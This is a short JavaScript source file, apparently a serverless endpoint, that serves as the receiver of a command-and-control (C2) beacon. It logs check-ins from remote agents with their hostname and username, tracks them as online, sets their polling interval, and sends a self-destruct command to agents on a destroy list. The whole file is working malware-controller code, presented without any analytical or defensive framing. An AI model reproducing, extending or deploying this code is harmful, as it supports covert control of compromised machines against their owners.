// api/beacon.js - Main C2 beacon receiver
const agents = new Map();
const destroyList = new Set();

export default async function handler(req, res) {
  // CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { data } = req.body;
    
    // Decrypt simple base64 (matches Python agent)
    let agentData;
    try {
      const decrypted = Buffer.from(data, 'base64').toString('utf8');
      agentData = JSON.parse(decrypted);
    } catch {
      // If already JSON
      agentData = typeof data === 'string' ? JSON.parse(data) : data;
    }
    
    const agentId = agentData.agent_id;
    
    // Update agent info
    agents.set(agentId, {
      ...agentData,
      last_seen: new Date().toISOString(),
      status: 'online'
    });
    
    console.log(`[BEACON] ${agentId} - ${agentData.hostname} (${agentData.username})`);
    
    // Check if agent should self-destruct
    if (destroyList.has(agentId)) {
      console.log(`[DESTROY] Sending nuke command to ${agentId}`);
      destroyList.delete(agentId);
      agents.delete(agentId);
      return res.json({ command: 'destroy' });
    }
    
    // Normal response
    res.json({ 
      command: 'continue',
      interval: 60
    });
    
  } catch (error) {
    console.error('[ERROR]', error);
    res.status(500).json({ error: 'Beacon processing failed' });
  }
}

// Export for other endpoints
export { agents, destroyList };
